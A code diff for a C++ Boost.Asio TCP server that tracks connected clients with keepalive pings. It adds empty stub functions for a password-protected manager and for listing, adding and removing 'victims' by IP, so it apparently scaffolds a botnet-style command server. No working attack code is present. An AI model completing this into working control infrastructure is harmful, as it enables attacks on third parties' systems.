@@ -4,7 +4,8 @@ server::server(io::io_context& io_context, std::uint16_t port)
     : io_context(io_context), acceptor(io_context, tcp::endpoint(tcp::v4(), port)) {}
 
 void server::start() {
-	routine_future_ = std::async(std::launch::async, &server::pingClients, this);
+	routine_future_ = std::async(std::launch::async, &server::pingClients,
+				     this);  // TODO: substitude this by boost::asio internal timeout clock
 	accept();
 }
 
@@ -15,37 +16,60 @@ void server::accept() {
 
 void server::onAccept(err error_code) {
 	int client_id = generateId();
-
 	clients_map.insert(std::make_pair(client_id, std::make_shared<session>(std::move(*socket), io_context, client_id)));
 	auto& client = clients_map.find(client_id)->second;
+
 	client->send("#: Connected succesfully\n");
 	std::cout << "New client connected." << std::endl;
 
-	// passes server callback function that will be triggered after
-	// reading a new recieved message from client
 	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
 	accept();
-}
-
-void server::notifyAll(std::string const& msg) {
-	for (auto& pair : clients_map) {
-		pair.second->send(msg);
-	}
 }
 
 void server::handleResponse(std::string& query, session* client) {
 	std::cout << client->endpoint_ << " Incoming query: " << query << std::endl;
 
-	if (query == "[QUIT]") {
+	if (query == "QUIT;True") {
 		client->stop();
 		clients_map.erase(client->id_);
 
 		std::cout << client->endpoint_ << " disconected" << std::endl;
 	}
-	if (std::string(query) == "[ALIVE]") {
+	if (std::string(query) == "ALIVE;True") {
 		client->inactive_timeout_count_ = 0;
 	}
 }
+
+void server::initManager(std::string passwd) {
+	// TODO: generate & save hash of given password for access to manager methods
+	//       & add the manager.
+}
+
+bool server::checkCredentials(std::string passwd) {
+	// TODO: check if given password coincides with saved admin hash.
+	return false;
+}
+
+void server::getClients() {
+	// TODO: (response function) return all present clients info.
+}
+
+void server::getVictims() {
+	// TODO: (response function) return all present victims ip's.
+}
+
+void server::addVictim(std::string ip) {
+	// TODO: (response function) add victim to global list of victims.
+}
+
+void server::removeClient(std::string ip) {
+	// TODO: (response function) remove client from clients_map.
+}
+
+void server::removeVictim(std::string ip) {
+	// TODO: (response function) remove victim from victim list.
+}
+
 void server::pingClients() {
 	while (true) {
 		usleep(INACTIVITY_TIMEOUT);
@@ -61,7 +85,6 @@ void server::pingClients() {
 
 				inactive_clients.push_back(client.second->id_);
 				client.second->stop();
-
 			} else {
 				client.second->send("Send '[ALIVE]' to approve your presence\n");
 			}
@@ -72,6 +95,12 @@ void server::pingClients() {
 				clients_map.erase(client_id);
 			}
 		}
+	}
+}
+
+void server::sendAllClients(std::string const& msg) {
+	for (auto& pair : clients_map) {
+		pair.second->send(msg);
 	}
 }
 
